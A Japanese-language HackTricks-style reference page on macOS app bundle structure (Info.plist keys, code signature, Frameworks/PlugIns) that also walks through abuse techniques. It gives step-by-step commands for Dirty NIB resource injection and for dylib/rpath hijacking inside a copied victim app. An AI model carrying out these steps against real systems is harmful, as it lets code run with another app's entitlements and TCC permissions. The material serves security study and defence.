# macOS バンドル

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

macOS のバンドルは、アプリケーション、ライブラリ、その他必要なファイルなどさまざまなリソースを格納するコンテナとして機能し、Finder 上で単一のオブジェクト（よく目にする `*.app` ファイルなど）として表示されます。もっとも一般的なのは `.app` バンドルですが、`.framework`、`.systemextension`、`.kext` のような他の種類もよく見られます。

### バンドルの主要コンポーネント

バンドル内、特に `<application>.app/Contents/` ディレクトリの中には、さまざまな重要なリソースが格納されています:

- **\_CodeSignature**: このディレクトリは、アプリケーションの整合性を検証するために重要なコード署名情報を格納します。コード署名情報は次のようなコマンドで確認できます:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: ユーザーの操作で動作するアプリケーションの実行可能バイナリを含みます。
- **Resources**: 画像、ドキュメント、インターフェースの記述（nib/xib ファイル）など、アプリケーションのユーザーインターフェースコンポーネントを格納するリポジトリ。
- **Info.plist**: アプリケーションの主要な設定ファイルとして機能し、システムがアプリを適切に認識・操作するために重要です。

#### Important Keys in Info.plist

The `Info.plist` ファイルはアプリ設定の中核であり、次のようなキーを含みます：

- **CFBundleExecutable**: `Contents/MacOS` ディレクトリにあるメイン実行ファイルの名前を指定します。
- **CFBundleIdentifier**: アプリのグローバル識別子を提供し、macOS がアプリ管理に広く使用します。
- **LSMinimumSystemVersion**: アプリを実行するために必要な最小の macOS バージョンを示します。

### Exploring Bundles

例として `Safari.app` の内容を調べるには、次のコマンドを使用します： `bash ls -lR /Applications/Safari.app/Contents`

この調査で `_CodeSignature`、`MacOS`、`Resources` のようなディレクトリや `Info.plist` のようなファイルが表示されます。これらはアプリのセキュリティやユーザーインターフェース、動作パラメータの定義など、それぞれ固有の役割を果たします。

#### Additional Bundle Directories

Beyond the common directories, bundles may also include:

- **Frameworks**: アプリが使用するバンドル化された frameworks を格納します。Frameworks は追加リソースを持つ dylibs のようなものです。
- **PlugIns**: アプリの機能を拡張するプラグインや拡張機能のためのディレクトリ。
- **XPCServices**: プロセス外通信のためにアプリが使用する XPC サービスを格納します。

この構造により、必要なコンポーネントがバンドル内にカプセル化され、モジュール化され安全なアプリ環境が実現されます。

For more detailed information on `Info.plist` keys and their meanings, the Apple developer documentation provides extensive resources: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: クォランタインされたバンドルが初めて実行されるとき、macOS は深い署名検証を実行し、ランダム化された translocated パスから実行することがあります。一度受け入れられると、その後の起動では浅いチェックのみが行われてきました；`Resources/`、`PlugIns/`、nibs などのリソースファイルは歴史的にチェックされていませんでした。macOS 13 Ventura 以降は初回実行時に深い検査が強制され、さらに新しい *App Management* TCC permission によりサードパーティプロセスがユーザーの同意なしに他のバンドルを変更することが制限されますが、古いシステムは依然として脆弱です。
- **Bundle Identifier collisions**: 複数の埋め込みターゲット（PlugIns、helper tools）が同じ `CFBundleIdentifier` を再利用すると、署名検証が壊れ、場合によっては URL‑scheme ハイジャック／混乱を引き起こす可能性があります。常にサブバンドルを列挙し、一意の ID を確認してください。

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura より前では、署名済みアプリの UI リソースを差し替えることで浅いコード署名検証を回避し、アプリの entitlements を伴うコード実行を得ることができました。現在の研究（2024）では、これが依然として pre‑Ventura および未クォランタインのビルドで動作することが示されています：

1. 対象アプリを書き込み可能な場所にコピーします（例: `/tmp/Victim.app`）。
2. `Contents/Resources/MainMenu.nib`（または `NSMainNibFile` で宣言されている任意の nib）を、`NSAppleScript`、`NSTask` 等をインスタンス化する悪意のあるものに置き換えます。
3. アプリを起動します。悪意のある nib は被害者のバンドル ID と entitlements（TCC の許可、マイク/カメラなど）で実行されます。
4. Ventura 以降では、初回起動時にバンドルを深く検証し、以降の変更には *App Management* 権限を要求することで緩和されています。したがって永続化は難しくなりましたが、古い macOS に対する初回起動時の攻撃は依然として有効です。

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

`@rpath` の探索はバンドル内の Frameworks/PlugIns を優先するため、`Contents/Frameworks/` や `Contents/PlugIns/` に悪意のあるライブラリを置くことで、メインバイナリがライブラリ検証なしで署名されている、または `LC_RPATH` の順序が弱い場合にロード順序を切り替えられます。

署名されていない/ad‑hoc バンドルを悪用する際の典型的な手順:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- `com.apple.security.cs.disable-library-validation` がない Hardened runtime は third‑party dylibs のロードをブロックする。まず entitlements を確認する。
- `Contents/XPCServices/` 以下の XPC サービスは隣接するフレームワークを読み込むことが多い — persistence や privilege escalation の経路として、それらのバイナリも同様にパッチする。

## クイック検査 チートシート
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 参考文献

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
